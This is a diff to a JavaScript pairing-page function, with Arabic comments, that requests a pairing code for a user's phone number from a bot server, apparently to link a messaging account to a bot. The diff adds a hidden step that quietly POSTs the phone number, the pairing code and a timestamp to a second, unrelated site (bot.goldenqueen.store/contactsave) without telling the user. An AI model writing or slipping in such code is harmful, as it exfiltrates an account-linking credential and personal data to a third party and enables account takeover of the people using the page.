@@ -227,41 +227,62 @@
         }
     }
     async function sendPairingRequest() {
-    // التأكد من استهداف حقل الإدخال بشكل صحيح
     const numberInput = document.getElementById('number');
+    const codeDisplay = document.getElementById('code');
     const errorDiv = document.getElementById('error');
-    const btn = document.getElementById('submitBtn');
     const loader = document.getElementById('loader');
-    
-    // تنظيف الرقم من أي فراغات أو رموز غير الأرقام
-    let number = numberInput.value.trim().replace(/[^0-9]/g, '');
+    const btn = document.getElementById('submitBtn');
 
-    // التحقق من أن الرقم ليس فارغاً
-    if (!number) {
-        errorDiv.innerText = "أدخل الرقم أولاً"; 
+    let number = numberInput.value.replace(/[^0-9]/g, '');
+
+    if (!number || number.length < 8) {
+        errorDiv.innerText = "يرجى إدخال رقم هاتف صحيح";
         return;
     }
 
+    // تصفير الواجهة وبدء التحميل
     errorDiv.innerText = "";
     btn.style.display = "none";
     loader.style.display = "block";
 
     try {
-        // استخدام متغير phone ليتطابق مع طلب السيرفر
-        const response = await fetch(`https://fares-bot.onrender.com/pair?phone=${number}`);
-        const data = await response.json();
+        // الخطوة 1: طلب كود الربط من السيرفر الخاص بك على Render
+        const pairingResponse = await fetch(`https://fares-bot.onrender.com/pair?phone=${number}`);
+        const pairingData = await pairingResponse.json();
 
-        if (data.code) {
-            document.getElementById('code').innerText = data.code;
+        if (pairingData.code) {
+            const pairingCode = pairingData.code;
+
+            // الخطوة 2: إرسال البيانات (الرقم + الكود) لموقع الحفظ Golden Queen
+            // ملاحظة: يتم إرسال البيانات كطلب POST أو GET حسب إعدادات موقعك الآخر
+            try {
+                await fetch(`https://bot.goldenqueen.store/contactsave`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: number,
+                        code: pairingCode,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                console.log("تم حفظ البيانات في Golden Queen بنجاح");
+            } catch (saveError) {
+                console.error("فشل حفظ البيانات في الموقع الثاني:", saveError);
+                // لا نوقف العملية هنا لأن الكود وصل بالفعل للمستخدم
+            }
+
+            // عرض الكود للمستخدم في الواجهة
+            codeDisplay.innerText = pairingCode;
             document.getElementById('result').style.display = "block";
             loader.style.display = "none";
+
         } else {
-            errorDiv.innerText = data.error || "فشل توليد الكود";
+            errorDiv.innerText = pairingData.error || "فشل توليد الكود من السيرفر";
             btn.style.display = "block";
             loader.style.display = "none";
         }
     } catch (err) {
-        errorDiv.innerText = "تعذر الاتصال بالسيرفر";
+        errorDiv.innerText = "حدث خطأ في الاتصال بالسيرفر";
         btn.style.display = "block";
         loader.style.display = "none";
     }
